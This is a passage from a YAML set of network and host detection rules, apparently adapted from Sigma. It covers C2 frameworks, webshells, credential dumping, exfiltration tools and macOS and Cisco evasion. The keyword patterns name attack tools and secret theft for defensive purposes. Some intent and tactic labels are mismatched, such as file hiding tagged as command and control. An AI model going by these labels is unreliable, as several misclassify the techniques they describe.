    which allows the execution of commands on the BIG-IP
  conditions:
    summary:
      regex_any:
      - icontrol
      - rest
      - command
      - execution
      - proxy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1712bafe_be05_4a0e_89d4_17a3ed151bf5
  intent: unknown
  tactic: reconnaissance
  description: 'Detects network traffic potentially associated with a scraper botnet
    variant that uses the "Hello-World/1.0" user-agent string.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - hello
      - world
      - scraper
      - botnet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_304810ed_8853_437f_9e36_c4975c3dfd7e
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects Baby Shark C2 Framework default communication patterns
  conditions:
    summary:
      regex_any:
      - hacktool
      - babyshark
      - agent
      - default
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f3f21ce1_cdef_4bfc_8328_ed2e826f5fac
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects cobalt strike malleable profiles patterns (URI, User-Agents,
    Methods).
  conditions:
    summary:
      regex_any:
      - hacktool
      - cobaltstrike
      - malleable
      - profile
      - patterns
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b923f7d6_ac89_4a50_a71a_89fb846b4aa8
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects user agent and URI paths used by empire agents
  conditions:
    summary:
      regex_any:
      - hacktool
      - empire
      - useragent
      - combo
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1a9bb21a_1bb5_42d7_aa05_3219c7c8f47d
  intent: unknown
  tactic: reconnaissance
  description: Detect the update check performed by Advanced IP/Port Scanner utilities.
  conditions:
    summary:
      regex_any:
      - advanced
      - port
      - scanner
      - update
      - check
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2b1ee7e4_89b6_4739_b7bb_b811b6607e5e
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects downloads from PwnDrp web servers developed for red team testing
    and most likely also used for criminal activity
  conditions:
    summary:
      regex_any:
      - pwndrp
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5468045b_4fcc_4d1a_973c_c9c9578edacb
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects direct access to raw pastes in different paste services often
    used by malware in their second stages to download malicious code in encrypted
    or encoded form
  conditions:
    summary:
      regex_any:
      - paste
      - service
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4922a5dd_6743_4fc2_8e81_144374280997
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a flashplayer update from an unofficial location
  conditions:
    summary:
      regex_any:
      - flash
      - player
      - update
      - from
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b494b165_6634_483d_8c47_2026a6c52372
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects suspicious requests to Telegram API without the usual Telegram
    User-Agent
  conditions:
    summary:
      regex_any:
      - telegram
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6ec820f2_e963_4801_9127_d8b2dce4d31b
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects suspicious user agent strings used in APT malware in proxy
    logs
  conditions:
    summary:
      regex_any:
      - user
      - agent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d443095b_a221_4957_a2c4_cd1756c9b747
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects suspicious encoded User-Agent strings, as seen used by some
    malware.
  conditions:
    summary:
      regex_any:
      - suspicious
      - base64
      - encoded
      - user
      - agent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8ccd35a2_1c7c_468b_b568_ac6cdf80eec3
  intent: unknown
  tactic: s0190
  description: Detects Bitsadmin connections to IP addresses instead of FQDN names
  conditions:
    summary:
      regex_any:
      - bitsadmin
      - uncommon
      - server
      - address
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9eb68894_7476_4cd6_8752_23b51f5883a7
  intent: unknown
  tactic: s0190
  description: Detects Bitsadmin connections to domains with uncommon TLDs
  conditions:
    summary:
      regex_any:
      - bitsadmin
      - uncommon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fa935401_513b_467b_81f4_f9e77aa0dd78
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects suspicious user agent strings used by crypto miners in proxy
    logs
  conditions:
    summary:
      regex_any:
      - crypto
      - miner
      - user
      - agent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_21e44d78_95e7_421b_a464_ffd8395659c4
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects a potentially suspicious empty user agent strings in proxy
    log.

    Could potentially indicate an uncommon request method.

    '
  conditions:
    summary:
      regex_any:
      - http
      - request
      - with
      - empty
      - user
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fdd1bfb5_f60b_4a35_910e_f36ed3d0b32f
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects suspicious user agent strings used by exploit / pentest frameworks
    like Metasploit in proxy logs
  conditions:
    summary:
      regex_any:
      - exploit
      - framework
      - user
      - agent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c42a3073_30fb_48ae_8c99_c23ada84b103
  intent: credential_harvesting
  tactic: credential_access
  description: Detects suspicious user agent strings user by hack tools in proxy logs
  conditions:
    summary:
      regex_any:
      - hack
      - tool
      - user
      - agent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5c84856b_55a5_45f1_826f_13f37250cf4e
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects suspicious user agent strings used by malware in proxy logs
  conditions:
    summary:
      regex_any:
      - malware
      - user
      - agent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c8557060_9221_4448_8794_96320e6f3e74
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects Windows PowerShell Web Access
  conditions:
    summary:
      regex_any:
      - windows
      - powershell
      - user
      - agent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2c03648b_e081_41a5_b9fb_7d854a915091
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects the use of rclone, a command-line program to manage files on
    cloud storage, via its default user-agent string
  conditions:
    summary:
      regex_any:
      - rclone
      - activity
      - proxy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7195a772_4b3f_43a4_a210_6a003d65caa1
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects suspicious malformed user agent strings in proxy logs
  conditions:
    summary:
      regex_any:
      - suspicious
      - user
      - agent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_894a8613_cf12_48b3_8e57_9085f54aa0c3
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects User Agent strings that end with an equal sign, which can be
    a sign of base64 encoding.
  conditions:
    summary:
      regex_any:
      - potential
      - base64
      - encoded
      - user
      - agent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1ae64f96_72b6_48b3_ad3d_e71dff6c6398
  intent: unknown
  tactic: resource_development
  description: 'Detects executables launched from external WebDAV shares using the
    WebDAV Explorer integration, commonly seen in initial access campaigns.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - external
      - webdav
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_85254a62_22be_4239_b79c_2ec17e566c37
  intent: unknown
  tactic: initial_access
  description: Detects POST requests to the F5 BIG-IP iControl Rest API "bash" endpoint,
    which allows the execution of commands on the BIG-IP
  conditions:
    summary:
      regex_any:
      - icontrol
      - rest
      - command
      - execution
      - webserver
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7cb02516_6d95_4ffc_8eee_162075e111ac
  intent: unknown
  tactic: initial_access
  description: When IIS uses an old .Net Framework it's possible to enumerate folders
    with the symbol "~"
  conditions:
    summary:
      regex_any:
      - successful
      - shortname
      - fuzzing
      - scan
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_583aa0a2_30b1_4d62_8bf3_ab73689efe6c
  intent: unknown
  tactic: initial_access
  description: Detects possible Java payloads in web access logs
  conditions:
    summary:
      regex_any:
      - java
      - payload
      - strings
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_412d55bc_7737_4d25_9542_5b396867ce55
  intent: unknown
  tactic: initial_access
  description: Detects exploitation attempt using the JNDI-Exploit-Kit
  conditions:
    summary:
      regex_any:
      - jndiexploit
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7745c2ea_24a5_4290_b680_04359cb84b35
  intent: unknown
  tactic: initial_access
  description: Detects path traversal exploitation attempts
  conditions:
    summary:
      regex_any:
      - path
      - traversal
      - exploitation
      - attempts
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_953d460b_f810_420a_97a2_cfca4c98e602
  intent: reconnaissance
  tactic: discovery
  description: Detects source code enumeration that use GET requests by keyword searches
    in URL strings
  conditions:
    summary:
      regex_any:
      - source
      - code
      - enumeration
      - detection
      - keyword
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5513deaf_f49a_46c2_a6c8_3f111b5cb453
  intent: unknown
  tactic: initial_access
  description: Detects potential SQL injection attempts via GET requests in access
    logs.
  conditions:
    summary:
      regex_any:
      - injection
      - strings
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ada3bc4f_f0fd_42b9_ba91_e105e8af7342
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects SSTI attempts sent via GET requests in access logs
  conditions:
    summary:
      regex_any:
      - server
      - side
      - template
      - injection
      - strings
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_19aa4f58_94ca_45ff_bc34_92e533c0994a
  intent: unknown
  tactic: initial_access
  description: Detects known suspicious (default) user-agents related to scanning/recon
    tools
  conditions:
    summary:
      regex_any:
      - suspicious
      - user
      - agents
      - related
      - recon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9f6a34b4_2688_4eb7_a7f5_e39fef573d0e
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects suspicious Windows strings in URI which could indicate possible
    exfiltration or webshell communication
  conditions:
    summary:
      regex_any:
      - suspicious
      - windows
      - strings
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2ea44a60_cfda_11ea_87d0_0242ac130003
  intent: persistence_installation
  tactic: persistence
  description: Certain strings in the uri_query field when combined with null referer
    and null user agent can indicate activity associated with the webshell ReGeorg.
  conditions:
    summary:
      regex_any:
      - webshell
      - regeorg
      - detection
      - logs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7ff9db12_1b94_4a79_ba68_a2402c5d6729
  intent: persistence_installation
  tactic: persistence
  description: Detects common commands used in Windows webshells
  conditions:
    summary:
      regex_any:
      - windows
      - webshell
      - strings
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_65354b83_a2ea_4ea6_8414_3ab38be0d409
  intent: unknown
  tactic: initial_access
  description: Detects XSS attempts injected via GET requests in access logs
  conditions:
    summary:
      regex_any:
      - cross
      - site
      - scripting
      - strings
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1da8ce0b_855d_4004_8860_7d64d42063b1
  intent: impact_operations
  tactic: impact
  description: Detects a segmentation fault error message caused by a crashing apache
    worker process
  conditions:
    summary:
      regex_any:
      - apache
      - segmentation
      - fault
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e9a2b582_3f6a_48ac_b4a1_6849cdc50b3c
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects an issue in apache logs that reports threading related errors
  conditions:
    summary:
      regex_any:
      - apache
      - threading
      - error
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_59ec40bb_322e_40ab_808d_84fa690d7e56
  intent: impact_operations
  tactic: impact
  description: Detects a core dump of a crashing Nginx worker process, which could
    be a signal of a serious problem or exploitation attempts.
  conditions:
    summary:
      regex_any:
      - nginx
      - core
      - dump
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aff715fa_4dd5_497a_8db3_910bea555566
  intent: unknown
  tactic: reconnaissance
  description: Detects suspicious DNS queries to external service interaction domains
    often used for out-of-band interactions after successful RCE
  conditions:
    summary:
      regex_any:
      - query
      - external
      - service
      - interaction
      - domains
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2975af79_28c4_4d2f_a951_9095f229df29
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects suspicious DNS queries known from Cobalt Strike beacons
  conditions:
    summary:
      regex_any:
      - cobalt
      - strike
      - beaconing
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b593fd50_7335_4682_a36c_4edcb68e4641
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects suspicious DNS queries to Monero mining pools
  conditions:
    summary:
      regex_any:
      - monero
      - crypto
      - coin
      - mining
      - pool
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4153a907_2451_4e4f_a578_c52bb6881432
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects suspicious DNS queries using base64 encoding
  conditions:
    summary:
      regex_any:
      - suspicious
      - query
      - with
      - encoded
      - string
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c64c5175_5189_431b_a55e_6d9882158251
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects suspicious DNS queries to api.telegram.org used by Telegram
    Bots of any kind
  conditions:
    summary:
      regex_any:
      - telegram
      - request
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8ae51330_899c_4641_8125_e39f2e07da72
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects strings used in command execution in DNS TXT Answer
  conditions:
    summary:
      regex_any:
      - answer
      - with
      - possible
      - execution
      - strings
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3eaf6218_3bed_4d8a_8707_274096f12a18
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects wannacry killswitch domain dns queries
  conditions:
    summary:
      regex_any:
      - wannacry
      - killswitch
      - domain
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b640c0b8_87f8_4daa_aef8_95a24261dd1d
  intent: execution
  tactic: execution
  description: Windows DCE-RPC functions which indicate an execution techniques on
    the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation
    field goes to MITRE
  conditions:
    summary:
      regex_any:
      - mitre
      - bzar
      - indicators
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_53389db6_ba46_48e3_a94c_e0f2cefe1583
  intent: persistence_installation
  tactic: persistence
  description: Windows DCE-RPC functions which indicate a persistence techniques on
    the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation
    field goes to MITRE.
  conditions:
    summary:
      regex_any:
      - mitre
      - bzar
      - indicators
      - persistence
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4096842a_8f9f_4d36_92b4_d0b2a62f9b2a
  intent: credential_harvesting
  tactic: credential_access
  description: "Detects usage of the windows RPC library Encrypting File System Remote\
    \ Protocol (MS-EFSRPC). Variations of this RPC are used within the attack refereed\
    \ to as PetitPotam.\nThe usage of this RPC function should be rare if ever used\
    \ at all.\nThus usage of this function is uncommon enough that any usage of this\
    \ RPC function should warrant further investigation to determine if it is legitimate.\n\
    \ View surrounding logs (within a few minutes before and after) from the Source\
    \ IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files,\
    \ rdp, ntlm, kerberos, etc..'\n"
  conditions:
    summary:
      regex_any:
      - potential
      - petitpotam
      - attack
      - calls
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7b33baef_2a75_4ca3_9da4_34f9a15382d8
  intent: execution
  tactic: execution
  description: 'Detects the remote installation of a print driver which is possible
    indication of the exploitation of PrintNightmare (CVE-2021-1675).

    The occurrence of print drivers being installed remotely via RPC functions should
    be rare, as print drivers are normally installed locally and or through group
    policy.

    '
  conditions:
    summary:
      regex_any:
      - possible
      - printnightmare
      - print
      - driver
      - install
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bae2865c_5565_470d_b505_9496c87d0c30
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects the use of the spoolss named pipe over SMB. This can be used
    to trigger the authentication via NTLM of any machine that has the spoolservice
    enabled.
  conditions:
    summary:
      regex_any:
      - spoolss
      - name
      - piped
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5588576c_5898_4fac_bcdd_7475a60e8f43
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects DNS queries containing patterns associated with Kerberos coercion
    attacks via DNS object spoofing.

    The pattern "1UWhRCAAAAA..BAAAA" is a base64-encoded signature that corresponds
    to a marshaled CREDENTIAL_TARGET_INFORMATION structure.

    Attackers can use this technique to coerce authentication from victim systems
    to attacker-controlled hosts.

    It is one of the strong indicators of a Kerberos coercion attack, where adversaries
    manipulate DNS records

    to spoof Service Principal Names (SPNs) and redirect authentication requests like
    CVE-2025-33073.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - query
      - indicating
      - kerberos
      - coercion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ede05abc_2c9e_4624_9944_9ff17fdc0bf5
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'The DNS Z flag is bit within the DNS protocol header that is, per
    the IETF design, meant to be used reserved (unused).

    Although recently it has been used in DNSSec, the value being set to anything
    other than 0 should be rare.

    Otherwise if it is set to non 0 and DNSSec is being used, then excluding the legitimate
    domains is low effort and high reward.

    Determine if multiple of these files were accessed in a short period of time to
    further enhance the possibility of seeing if this was a one off or the possibility
    of larger sensitive file gathering.

    This Sigma query is designed to accompany the Corelight Threat Hunting Guide,
    which can be found here: https://www3.corelight.com/corelights-introductory-guide-to-threat-hunting-with-zeek-bro-logs''

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - flag
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a8322756_015c_42e7_afb1_436e85ed3ff5
  intent: data_exfiltration
  tactic: exfiltration
  description: Identifies IPs performing DNS lookups associated with common Tor proxies.
  conditions:
    summary:
      regex_any:
      - proxies
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aac2fd97_bcba_491b_ad66_a6edf89c71bf
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects executable access via webdav6. Can be seen in APT 29 such as
    from the emulated APT 29 hackathon https://github.com/OTRF/detection-hackathon-apt29/
  conditions:
    summary:
      regex_any:
      - executable
      - from
      - webdav
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ab6b1a39_a9ee_4ab4_b075_e83acf6e346b
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects the exploitation of OMIGOD (CVE-2021-38647) which allows remote
    execute (RCE) commands as root with just a single unauthenticated HTTP request.

    Verify, successful, exploitation by viewing the HTTP client (request) body to
    see what was passed to the server (using PCAP).

    Within the client body is where the code execution would occur. Additionally,
    check the endpoint logs to see if suspicious commands or activity occurred within
    the timeframe of this HTTP request.

    '
  conditions:
    summary:
      regex_any:
      - omigod
      - http
      - authentication
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_68c2c604_92ad_468b_bf4a_aac49adad08c
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects HTTP requests to low reputation TLDs (e.g. .xyz, .top, .ru)
    or ending in suspicious file extensions (.exe, .dll, .hta), which may indicate
    malicious activity.

    '
  conditions:
    summary:
      regex_any:
      - http
      - request
      - reputation
      - suspicious
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1fc0809e_06bf_4de3_ad52_25e5263b7623
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects connections from routable IPs to an RDP listener. Which is
    indicative of a publicly-accessible RDP service.

    '
  conditions:
    summary:
      regex_any:
      - publicly
      - accessible
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dde85b37_40cd_4a94_b00c_0b8794f956b5
  intent: persistence_installation
  tactic: persistence
  description: Detects remote task creation via at.exe or API interacting with ATSVC
    namedpipe
  conditions:
    summary:
      regex_any:
      - remote
      - task
      - creation
      - atsvc
      - named
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_92dae1ed_1c9d_4eff_a567_33acbd95b00e
  intent: credential_harvesting
  tactic: credential_access
  description: Detect AD credential dumping using impacket secretdump HKTL. Based
    on the SIGMA rules/windows/builtin/win_impacket_secretdump.yml
  conditions:
    summary:
      regex_any:
      - possible
      - impacket
      - secretdump
      - remote
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_021310d9_30a6_480a_84b7_eaa69aeb92bb
  intent: lateral_movement
  tactic: lateral_movement
  description: This detection excludes known namped pipes accessible remotely and
    notify on newly observed ones, may help to detect lateral movement and remote
    exec using named pipes
  conditions:
    summary:
      regex_any:
      - first
      - time
      - seen
      - remote
      - named
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f1b3a22a_45e6_4004_afb5_4291f9c21166
  intent: lateral_movement
  tactic: lateral_movement
  description: detects execution of psexec or paexec with renamed service name, this
    rule helps to filter out the noise if psexec is used for legit purposes or if
    attacker uses a different psexec client other than sysinternal one
  conditions:
    summary:
      regex_any:
      - suspicious
      - psexec
      - execution
      - zeek
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_286b47ed_f6fe_40b3_b3a8_35129acd43bc
  intent: data_staging
  tactic: collection
  description: Detects known sensitive file extensions via Zeek
  conditions:
    summary:
      regex_any:
      - suspicious
      - access
      - sensitive
      - file
      - extensions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2e69f167_47b5_4ae7_a390_47764529eff5
  intent: credential_harvesting
  tactic: credential_access
  description: Transferring files with well-known filenames (sensitive files with
    credential data) using network shares
  conditions:
    summary:
      regex_any:
      - transferring
      - files
      - with
      - credential
      - data
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_503fe26e_b5f2_4944_a126_eab405cc06e5
  intent: credential_harvesting
  tactic: credential_access
  description: Detects kerberos TGS request using RC4 encryption which may be indicative
    of kerberoasting
  conditions:
    summary:
      regex_any:
      - kerberos
      - network
      - traffic
      - ticket
      - encryption
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ceb407f6_8277_439b_951f_e4210e3ed956
  intent: defense_evasion
  tactic: defense_evasion
  description: Clear command history in network OS which is used for defense evasion
  conditions:
    summary:
      regex_any:
      - cisco
      - clear
      - logs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1f978c6a_4415_47fb_aca5_736a44d7ca3d
  intent: defense_evasion
  tactic: defense_evasion
  description: Show when private keys are being exported from the device, or when
    new certificates are installed
  conditions:
    summary:
      regex_any:
      - cisco
      - crypto
      - commands
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9e8f6035_88bf_4a63_96b6_b17c0508257e
  intent: defense_evasion
  tactic: defense_evasion
  description: Turn off logging locally or remote
  conditions:
    summary:
      regex_any:
      - cisco
      - disabling
      - logging
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d94a35f0_7a29_45f6_90a0_80df6159967c
  intent: impact_operations
  tactic: impact
  description: Detect a system being shutdown or put into different boot mode
  conditions:
    summary:
      regex_any:
      - cisco
      - denial
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_71d65515_c436_43c0_841b_236b1f32c21e
  intent: impact_operations
  tactic: impact
  description: See what files are being deleted from flash file systems
  conditions:
    summary:
      regex_any:
      - cisco
      - file
      - deletion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b094d9fb_b1ad_4650_9f1a_fb7be9f1d34b
  intent: credential_harvesting
  tactic: credential_access
  description: See what commands are being input into the device by other people,
    full credentials can be in the history
  conditions:
    summary:
      regex_any:
      - cisco
      - show
      - commands
      - input
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6d844f0f_1c18_41af_8f19_33e7654edfc3
  intent: persistence_installation
  tactic: persistence
  description: Find local accounts being created or modified as well as remote authentication
    configurations
  conditions:
    summary:
      regex_any:
      - cisco
      - local
      - accounts
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_671ffc77_50a7_464f_9e3d_9ea2b493b26b
  intent: impact_operations
  tactic: impact
  description: Modifications to a config that will serve an adversary's impacts or
    persistence
  conditions:
    summary:
      regex_any:
      - cisco
      - modify
      - configuration
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b9e1f193_d236_4451_aaae_2f3d2102120d
  intent: reconnaissance
  tactic: discovery
  description: Show when a monitor or a span/rspan is setup or modified
  conditions:
    summary:
      regex_any:
      - cisco
      - sniffing
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_23c43900_e732_45a4_8354_63e4a6c187ce
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects additions to the Emond Launch Daemon that adversaries may use
    to gain persistence and elevate privileges.
  conditions:
    summary:
      regex_any:
      - macos
      - emond
      - launch
      - daemon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1bc2e6c5_0885_472b_bed6_be5ea8eace55
  intent: execution
  tactic: execution
  description: Detects execution of AppleScript of the macOS scripting language AppleScript.
  conditions:
    summary:
      regex_any:
      - macos
      - scripting
      - interpreter
      - applescript
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_95361ce5_c891_4b0a_87ca_e24607884a96
  intent: defense_evasion
  tactic: defense_evasion
  description: Adversaries may use binary padding to add junk data and change the
    on-disk representation of malware. This rule detect using dd and truncate to add
    a junk data to file.
  conditions:
    summary:
      regex_any:
      - binary
      - padding
      - macos
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_88c0f9d8_30a8_4120_bb6b_ebb54abcf2a0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect file time attribute change to hide new or changes to existing
    files
  conditions:
    summary:
      regex_any:
      - file
      - time
      - attribute
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3b2c1059_ae5f_40b6_b5d4_6106d3ac20fe
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects the execution of the "chflags" utility with the "hidden" flag,
    in order to hide files on MacOS.

    When a file or directory has this hidden flag set, it becomes invisible to the
    default file listing commands and in graphical file browsers.

    '
  conditions:
    summary:
      regex_any:
      - hidden
      - flag
      - file
      - directory
      - chflags
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_acf61bd8_d814_4272_81f0_a7a269aa69aa
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects deletion of local audit logs
  conditions:
    summary:
      regex_any:
      - indicator
      - removal
      - host
      - clear
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7794fa3c_edea_4cff_bec7_267dd4770fd7
  intent: execution
  tactic: execution
  description: Detects possible collection of data from the clipboard via execution
    of the osascript binary
  conditions:
    summary:
      regex_any:
      - clipboard
      - data
      - collection
      - osascript
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b22a5b36_2431_493a_8be1_0bae56c28ef3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects creation of a hidden user account on macOS (UserID < 500) or
    with IsHidden option
  conditions:
    summary:
      regex_any:
      - hidden
      - user
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b120b587_a4c2_4b94_875d_99c9807d6955
  intent: credential_harvesting
  tactic: credential_access
  description: Detects passwords dumps from Keychain
  conditions:
    summary:
      regex_any:
